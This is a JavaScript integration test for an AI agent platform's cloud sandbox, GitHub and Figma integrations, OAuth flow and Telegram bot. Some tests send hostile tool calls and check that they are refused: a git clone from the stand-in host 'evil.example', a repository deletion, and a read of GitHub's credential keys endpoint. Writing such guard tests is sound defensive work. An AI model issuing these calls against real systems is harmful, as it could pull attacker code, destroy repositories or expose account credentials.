const API = (process.env.API ?? "http://127.0.0.1:18090").replace(/\/$/, "");
const TG = (process.env.TG ?? "http://127.0.0.1:18097").replace(/\/$/, "");
const PROVIDERS = (process.env.PROVIDERS ?? "http://127.0.0.1:18095").replace(/\/$/, "");
const SANDBOX = (process.env.SANDBOX ?? "http://127.0.0.1:18096").replace(/\/$/, "");
const GH_TOKEN = "ghp_validtoken0123456789abcdef";
const FG_TOKEN = "figd_validtoken0123456789abcdef";

let passed = 0;
const failures = [];
function check(name, cond, detail) {
  if (cond) {
    passed += 1;
    console.log(`  ok   ${name}`);
  } else {
    failures.push(name);
    console.log(`  FAIL ${name}${detail === undefined ? "" : `: ${typeof detail === "string" ? detail : JSON.stringify(detail).slice(0, 600)}`}`);
  }
}

async function api(method, path, token, body, extra = {}) {
  const headers = {};
  if (token) headers.Authorization = `Bearer ${token}`;
  if (body !== undefined) headers["Content-Type"] = "application/json";
  const res = await fetch(API + path, { method, headers, body: body === undefined ? undefined : JSON.stringify(body), ...extra });
  let json = null;
  try {
    json = await res.json();
  } catch {}
  return { res, json };
}

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
async function until(fn, ms = 30000) {
  const end = Date.now() + ms;
  while (Date.now() < end) {
    const v = await fn();
    if (v) return v;
    await sleep(250);
  }
  return null;
}
const tglog = async () => (await fetch(`${TG}/_log`)).json();
const inject = (update) => fetch(`${TG}/_inject`, { method: "POST", body: JSON.stringify(update) });
const user = (id) => ({ id, is_bot: false, first_name: `Dev${id}`, username: `d${id}`, language_code: "en" });
const say = (id, text, message_id = 1) => inject({ message: { message_id, from: user(id), chat: { id, type: "private" }, text } });
const textsTo = (calls, chat) => calls.filter((c) => ["sendMessage", "editMessageText"].includes(c.method) && String(c.args.chat_id) === String(chat)).map((c) => c.args.text);

async function ask(token, chat, text) {
  const sent = await api("POST", `/chats/${chat}/messages`, token, { text });
  if (sent.res.status !== 201) return { error: sent.json };
  const mid = sent.json.assistant.id;
  const done = await until(async () => {
    const r = await api("GET", `/chats/${chat}/messages/${mid}`, token);
    return r.json?.status && r.json.status !== "pending" ? r.json : null;
  }, 60000);
  return done ?? { error: "timeout" };
}

async function main() {
  const email = `cloud-${Date.now()}@test.ir`;
  const tgid = 7000000 + (Date.now() % 1000000);
  const reg = await api("POST", "/auth/register", null, { name: "Cloud Dev", email, password: "password123" });
  const token = reg.json.token;

  const overview = await api("GET", "/integrations", token);
  check("sandbox and token storage are on", overview.json?.sandbox === true && overview.json?.storage === true, overview.json);
  check("nothing is connected at first", overview.json?.integrations?.every((i) => !i.connected));

  const bad = await api("POST", "/integrations/github/token", token, { token: "ghp_wrongtoken0123456789abcdefgh" });
  check("a rejected GitHub token is refused", bad.res.status === 400, bad.json);
  const short = await api("POST", "/integrations/github/token", token, { token: "short" });
  check("a malformed token is refused", short.res.status === 400);
  const gh = await api("POST", "/integrations/github/token", token, { token: GH_TOKEN });
  check("GitHub token accepted", gh.res.status === 200 && gh.json.connected && gh.json.login === "octo-dev", gh.json);
  const fg = await api("POST", "/integrations/figma/token", token, { token: FG_TOKEN });
  check("Figma token accepted", fg.res.status === 200 && fg.json.login === "designer", fg.json);
  check("the token is not returned anywhere", !JSON.stringify(gh.json).includes(GH_TOKEN) && !JSON.stringify((await api("GET", "/integrations", token)).json).includes(GH_TOKEN));

  const created = await api("POST", "/chats", token, { cloud: true });
  check("a cloud chat is created", created.res.status === 201 && created.json.chat.cloud === true, created.json);
  const chat = created.json.chat.id;

  let r = await ask(token, chat, 'tool: shell {"command": "echo hello > a.txt && cat a.txt && pwd"}');
  check("shell runs in the sandbox", /Tool said \(salam-agent\): ok hello\n/.test(r.body ?? ""), r);
  r = await ask(token, chat, 'tool: write_file {"path": "src/main.txt", "content": "line one\\nline two\\n"}');
  check("write_file creates folders", /wrote src\/main.txt/.test(r.body ?? ""), r);
  r = await ask(token, chat, 'tool: read_file {"path": "src/main.txt"}');
  check("read_file numbers lines", /1\tline one\n2\tline two/.test(r.body ?? ""), r);
  r = await ask(token, chat, 'tool: edit_file {"path": "src/main.txt", "old_text": "line two", "new_text": "line 2"}');
  check("edit_file replaces text", /edited src\/main.txt \(1 replacement\)/.test(r.body ?? ""), r);
  r = await ask(token, chat, 'tool: edit_file {"path": "src/main.txt", "old_text": "missing", "new_text": "x"}');
  check("edit_file reports a missing text", /was not found/.test(r.body ?? ""), r);
  r = await ask(token, chat, 'tool: list_dir {"path": "."}');
  check("list_dir lists the folder", /a\.txt/.test(r.body ?? "") && /src\//.test(r.body ?? ""), r);
  if (process.env.REAL_SANDBOX) {
    r = await ask(token, chat, 'tool: glob {"pattern": "*.txt", "path": "."}');
    check("glob finds files", /a\.txt/.test(r.body ?? "") && /src\/main\.txt/.test(r.body ?? ""), r);
    r = await ask(token, chat, 'tool: grep {"pattern": "line", "path": "src", "ignore_case": true}');
    check("grep finds text", /main\.txt:1:line one/.test(r.body ?? ""), r);
    r = await ask(token, chat, 'tool: grep {"pattern": "nothing-here-xyz"}');
    check("grep says when nothing matches", /no matches/.test(r.body ?? ""), r);
  }
  r = await ask(token, chat, 'tool: shell {"command": "sleep 3", "timeout": 1}');
  check("a slow command is stopped", /timed out/.test(r.body ?? ""), r);

  r = await ask(token, chat, 'tool: github_api {"path": "/user/repos"}');
  check("github_api reads private repositories", /octo-dev\/secret-app/.test(r.body ?? ""), r);
  r = await ask(token, chat, 'tool: github_api {"method": "DELETE", "path": "/repos/octo-dev/secret-app"}');
  check("repository deletion is blocked", /Deleting a repository is not allowed/.test(r.body ?? ""), r);
  r = await ask(token, chat, 'tool: github_api {"path": "/user/keys"}');
  check("credential endpoints are blocked", /manages account credentials/.test(r.body ?? ""), r);
  r = await ask(token, chat, 'tool: github_git {"args": ["clone", "https://evil.example/x.git"]}');
  check("git refuses foreign hosts", /not allowed/.test(r.body ?? ""), r);
  r = await ask(token, chat, 'tool: github_git {"args": ["status"]}');
  check("git refuses commands without a login", /Only clone, fetch, pull, push/.test(r.body ?? ""), r);
  r = await ask(token, chat, 'tool: figma_api {"path": "/v1/files/abc123"}');
  check("figma_api reads a file", /Landing page/.test(r.body ?? ""), r);
  r = await ask(token, chat, 'tool: figma_api {"method": "DELETE", "path": "/v1/files/abc123"}');
  check("figma_api refuses writes", /Only GET requests/.test(r.body ?? ""), r);
  r = await ask(token, chat, 'tool: figma_export {"file_key": "abc123", "ids": "1:2", "format": "png"}');
  check("figma_export saves images", /saved assets\/1-2\.png/.test(r.body ?? ""), r);
  r = await ask(token, chat, 'tool: shell {"command": "cat assets/1-2.png"}');
  check("the exported image is in the sandbox", /PNGDATA/.test(r.body ?? ""), r);
  r = await ask(token, chat, 'tool: docker {"args": ["ps"]}');
  check("desktop-only tools are refused", /only available in Salam Agent/.test(r.body ?? ""), r);

  const detail = await api("GET", `/chats/${chat}`, token);
  const calls = detail.json?.calls ?? [];
  check("every tool call is recorded", calls.length >= 16, calls.length);
  check("a shell call keeps its command and output", calls.some((c) => c.tool === "shell" && c.kind === "exec" && c.state === "done" && /hello/.test(c.output)), calls[0]);
  check("file calls are read or write kinds", calls.some((c) => c.tool === "write_file" && c.kind === "write") && calls.some((c) => c.tool === "read_file" && c.kind === "read"));

  const plain = await api("POST", "/chats", token, {});
  const answered = await ask(token, plain.json.chat.id, "tool: shell {\"command\": \"echo x\"}");
  check("a normal chat has no sandbox", !/Tool said/.test(answered.body ?? ""), answered);

  const oauth = await api("POST", "/integrations/github/oauth", token);
  const state = /state=([0-9a-f]+)/.exec(oauth.json?.url ?? "")?.[1];
  check("GitHub sign in link is made", oauth.res.status === 200 && /client_id=gh-client/.test(oauth.json.url) && !!state, oauth.json);
  await api("DELETE", "/integrations/github", token);
  const back = await fetch(`${API}/integrations/github/callback?code=abc&state=${state}`, { redirect: "manual" });
  check("the callback sends the browser back", back.status === 302 && /connected=github&result=ok/.test(back.headers.get("location") ?? ""), back.headers.get("location"));
  const after = await api("GET", "/integrations", token);
  check("OAuth connected GitHub", after.json.integrations.find((i) => i.provider === "github").connected === true, after.json);
  const replay = await fetch(`${API}/integrations/github/callback?code=abc&state=${state}`, { redirect: "manual" });
  check("a state works once", /result=expired/.test(replay.headers.get("location") ?? ""));
  await api("DELETE", "/integrations/figma", token);
  r = await ask(token, chat, 'tool: figma_api {"path": "/v1/me"}');
  check("a disconnected service says so", /has not connected Figma/.test(r.body ?? ""), r);

  const tgBoot = await until(async () => (await tglog()).some((c) => c.method === "getMe"));
  check("telegram bot is up", !!tgBoot);
  await say(tgid, "/login");
  const loginMsg = await until(async () => (await tglog()).find((c) => String(c.args.chat_id) === String(tgid) && c.args.reply_markup?.inline_keyboard));
  const code = /code=([0-9a-f]{32})/.exec(loginMsg?.args.reply_markup.inline_keyboard[0][0].url ?? "")?.[1];
  const linked = await api("POST", "/telegram/link", token, { code });
  check("telegram linked for the cloud test", linked.res.status === 200, linked.json);
  await say(tgid, '/github');
  check("/github explains how to connect", !!(await until(async () => textsTo(await tglog(), tgid).find((t) => /GitHub is connected: octo-dev/.test(t)))));
  await say(tgid, `/github ${GH_TOKEN}`, 4242);
  check("/github with a token connects it", !!(await until(async () => textsTo(await tglog(), tgid).find((t) => /GitHub connected: octo-dev/.test(t)))));
  check("the message with the token is deleted", (await tglog()).some((c) => c.method === "deleteMessage" && c.args.message_id === 4242));
  await say(tgid, '/github nottherealtoken0123456789abcdef');
  check("a bad token is explained", !!(await until(async () => textsTo(await tglog(), tgid).find((t) => /did not accept this token/.test(t)))));
  await say(tgid, 'tool: shell {"command": "echo from telegram"}');
  const tgAnswer = await until(async () => textsTo(await tglog(), tgid).find((t) => /Tool said \(salam-agent\): ok from telegram/.test(t)), 60000);
  check("telegram runs commands in the sandbox", !!tgAnswer);
  const listed = await api("GET", "/chats", token);
  check("the telegram cloud chat is in the history", listed.json.chats.some((c) => c.cloud === true && /tool: shell/.test(c.title)), listed.json.chats.map((c) => c.title));
  await say(tgid, "/sandbox");
  check("/sandbox explains itself", !!(await until(async () => textsTo(await tglog(), tgid).find((t) => /private Linux sandbox/.test(t)))));

  const deleted = await api("DELETE", `/chats/${chat}`, token);
  check("deleting a chat works", deleted.res.status === 200);

  console.log(`\n${passed} passed, ${failures.length} failed`);
  if (failures.length) {
    console.log(failures.join("\n"));
    process.exit(1);
  }
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
